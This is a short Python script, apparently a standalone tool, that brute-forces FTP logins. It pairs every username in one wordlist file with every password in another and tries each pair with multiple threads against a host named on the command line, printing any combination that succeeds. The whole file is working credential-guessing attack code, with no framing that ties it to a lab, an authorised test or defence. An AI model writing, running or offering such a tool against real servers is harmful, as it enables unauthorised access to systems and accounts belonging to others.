import ftplib
import concurrent.futures as cf
import queue
import sys

def generate_queue():
    _uname = open("uname.txt")
    _passwd = open("passwd.txt")
    uname = _uname.readlines()
    passwd = _passwd.readlines()
    _uname.close()
    _passwd.close()
    q = queue.Queue()
    [q.put((i.strip("\n").strip("\t"), j.strip("\n").strip("\t"))) for i in uname for j in passwd]
    return q
    
def brute_ftp(q):
    global host
    f = ftplib.FTP()
    f.connect(host, 21)
    while not q.empty():
        u_p_tuple = q.get()
        try:
            print(f"[*]Trying {u_p_tuple}")
            f.login(u_p_tuple[0], u_p_tuple[1])
            print(f'[*]Success! {u_p_tuple}')
            return
        except InterruptedError:
            sys.exit(0)
        except:
            continue
    f.close()

def run(q):
    global MAXTHREAD
    p = cf.ThreadPoolExecutor(max_workers=3)
    for i in range(MAXTHREAD):
        p.submit(brute_ftp, q)
    
if __name__ == "__main__":
    host = sys.argv[1]
    MAXTHREAD = 8
    q = generate_queue()
    run(q)